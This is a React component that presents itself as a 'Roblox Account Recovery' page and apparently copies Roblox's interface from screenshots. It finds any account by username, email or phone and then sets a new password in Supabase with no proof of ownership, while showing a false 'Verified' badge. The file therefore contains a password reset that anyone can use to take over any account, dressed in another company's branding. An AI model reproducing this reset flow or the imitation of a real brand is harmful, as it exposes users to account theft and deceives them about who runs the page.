import React, { useState } from 'react';
import { Loader2, AlertCircle, CheckCircle2, ArrowLeft, KeyRound, Eye, EyeOff } from 'lucide-react';
import { findUserForRecovery, updateUserPassword } from '../lib/supabase';

export default function AccountRecoveryCard({ onBackToLogin }) {
  const [identifier, setIdentifier] = useState('');
  const [step, setStep] = useState(1); // 1: Enter Username/Email/Phone, 2: Reset Password, 3: Success
  const [isLoading, setIsLoading] = useState(false);
  const [errorMsg, setErrorMsg] = useState('');
  const [foundUser, setFoundUser] = useState(null);

  // Step 2 Password Reset states
  const [newPassword, setNewPassword] = useState('');
  const [confirmPassword, setConfirmPassword] = useState('');
  const [showPassword, setShowPassword] = useState(false);

  const handleLookup = async (e) => {
    e.preventDefault();
    if (!identifier.trim()) {
      setErrorMsg('Please enter your username, email, or phone number.');
      return;
    }

    setIsLoading(true);
    setErrorMsg('');

    try {
      const res = await findUserForRecovery(identifier);
      if (res.success && res.user) {
        setFoundUser(res.user);
        setStep(2);
      } else {
        setErrorMsg(res.error || 'We couldn’t find an account matching that username, email, or phone number.');
      }
    } catch (err) {
      setErrorMsg('An error occurred during account lookup.');
      console.error(err);
    } finally {
      setIsLoading(false);
    }
  };

  const handleResetPassword = async (e) => {
    e.preventDefault();
    if (newPassword.length < 8) {
      setErrorMsg('New password must be at least 8 characters.');
      return;
    }
    if (newPassword !== confirmPassword) {
      setErrorMsg('Passwords do not match. Please re-enter.');
      return;
    }

    setIsLoading(true);
    setErrorMsg('');

    try {
      const res = await updateUserPassword(foundUser.username, newPassword);
      if (res.success) {
        setStep(3);
      } else {
        setErrorMsg('Failed to update password. Please try again.');
      }
    } catch (err) {
      setErrorMsg('An unexpected error occurred while resetting password.');
      console.error(err);
    } finally {
      setIsLoading(false);
    }
  };

  return (
    <div className="w-full max-w-[440px] mx-auto bg-[#22242a]/95 backdrop-blur-md rounded-xl p-7 sm:p-8 shadow-2xl border border-zinc-700/60 text-left transition-all">
      {/* Title */}
      <h1 className="text-white text-2xl font-black text-center mb-6 tracking-tight select-none">
        Roblox Account Recovery
      </h1>

      {/* Error Alert */}
      {errorMsg && (
        <div className="mb-4 p-3 bg-red-950/70 border border-red-600/70 rounded-md text-red-200 text-xs flex items-start gap-2">
          <AlertCircle className="w-4 h-4 text-red-400 shrink-0 mt-0.5" />
          <span>{errorMsg}</span>
        </div>
      )}

      {/* STEP 1: Look up Username/Email/Phone (Matches Screenshot 1) */}
      {step === 1 && (
        <form onSubmit={handleLookup} className="space-y-4">
          <div>
            <label className="block text-zinc-300 text-xs sm:text-sm font-semibold mb-1.5 select-none">
              Username/Email/Phone
            </label>
            <input
              type="text"
              value={identifier}
              onChange={(e) => {
                setIdentifier(e.target.value);
                setErrorMsg('');
              }}
              placeholder="Enter your username, email, or phone number"
              className="w-full bg-[#353740] hover:bg-[#3b3d47] focus:bg-[#353740] border border-[#484b57] focus:border-zinc-300 text-white placeholder-[#8e929c] text-sm rounded-md px-3.5 py-3 outline-none transition-colors"
            />
          </div>

          <div className="pt-2">
            <button
              type="submit"
              disabled={isLoading}
              className="w-full bg-[#284ebd] hover:bg-[#335ae0] text-white font-bold text-sm rounded-md py-3 transition-colors flex items-center justify-center gap-2 cursor-pointer shadow-md active:scale-[0.99] select-none"
            >
              {isLoading ? (
                <>
                  <Loader2 className="w-4 h-4 animate-spin text-white" />
                  <span>Searching Database...</span>
                </>
              ) : (
                'Next'
              )}
            </button>
          </div>

          <div className="pt-2 text-center">
            <button
              type="button"
              onClick={onBackToLogin}
              className="inline-flex items-center gap-1.5 text-xs text-zinc-400 hover:text-white transition-colors cursor-pointer"
            >
              <ArrowLeft className="w-3.5 h-3.5" />
              <span>Back to Login</span>
            </button>
          </div>
        </form>
      )}

      {/* STEP 2: Account Found -> Reset Password dynamically */}
      {step === 2 && foundUser && (
        <form onSubmit={handleResetPassword} className="space-y-4">
          <div className="p-3 bg-zinc-900/90 border border-zinc-700/80 rounded-lg flex items-center justify-between">
            <div>
              <span className="text-[11px] text-zinc-400 block">Account Found in Database:</span>
              <span className="text-white font-bold text-sm">{foundUser.username}</span>
            </div>
            <span className="px-2 py-0.5 rounded text-[10px] bg-emerald-950 text-emerald-300 border border-emerald-800 font-mono">
              Verified
            </span>
          </div>

          <div>
            <label className="block text-zinc-300 text-xs font-semibold mb-1">
              New Password
            </label>
            <div className="relative">
              <input
                type={showPassword ? 'text' : 'password'}
                value={newPassword}
                onChange={(e) => {
                  setNewPassword(e.target.value);
                  setErrorMsg('');
                }}
                placeholder="At least 8 characters"
                className="w-full bg-[#353740] border border-[#484b57] focus:border-zinc-300 text-white text-sm rounded-md px-3.5 py-2.5 pr-10 outline-none"
              />
              <button
                type="button"
                onClick={() => setShowPassword(!showPassword)}
                className="absolute right-3 top-1/2 -translate-y-1/2 text-zinc-400 hover:text-white"
              >
                {showPassword ? <EyeOff className="w-4 h-4" /> : <Eye className="w-4 h-4" />}
              </button>
            </div>
          </div>

          <div>
            <label className="block text-zinc-300 text-xs font-semibold mb-1">
              Confirm New Password
            </label>
            <input
              type={showPassword ? 'text' : 'password'}
              value={confirmPassword}
              onChange={(e) => {
                setConfirmPassword(e.target.value);
                setErrorMsg('');
              }}
              placeholder="Re-enter new password"
              className="w-full bg-[#353740] border border-[#484b57] focus:border-zinc-300 text-white text-sm rounded-md px-3.5 py-2.5 outline-none"
            />
          </div>

          <div className="pt-2">
            <button
              type="submit"
              disabled={isLoading}
              className="w-full bg-[#284ebd] hover:bg-[#335ae0] text-white font-bold text-sm rounded-md py-3 transition-colors flex items-center justify-center gap-2 cursor-pointer shadow-md"
            >
              {isLoading ? (
                <>
                  <Loader2 className="w-4 h-4 animate-spin" />
                  <span>Updating Supabase Database...</span>
                </>
              ) : (
                'Update Password'
              )}
            </button>
          </div>

          <div className="text-center pt-1">
            <button
              type="button"
              onClick={() => setStep(1)}
              className="text-xs text-zinc-400 hover:text-white"
            >
              Change Account
            </button>
          </div>
        </form>
      )}

      {/* STEP 3: Password Reset Success */}
      {step === 3 && (
        <div className="text-center py-4 space-y-4">
          <div className="w-14 h-14 rounded-full bg-emerald-500/10 border border-emerald-500/30 flex items-center justify-center text-emerald-400 mx-auto">
            <CheckCircle2 className="w-8 h-8" />
          </div>
          <div>
            <h2 className="text-white font-bold text-lg">Password Updated!</h2>
            <p className="text-zinc-400 text-xs mt-1">
              Your password for <strong className="text-white">{foundUser?.username}</strong> has been updated in Supabase.
            </p>
          </div>
          <button
            type="button"
            onClick={onBackToLogin}
            className="w-full bg-white hover:bg-zinc-200 text-black font-bold text-sm rounded-md py-2.5 transition-colors cursor-pointer shadow-md"
          >
            Go to Login
          </button>
        </div>
      )}
    </div>
  );
}
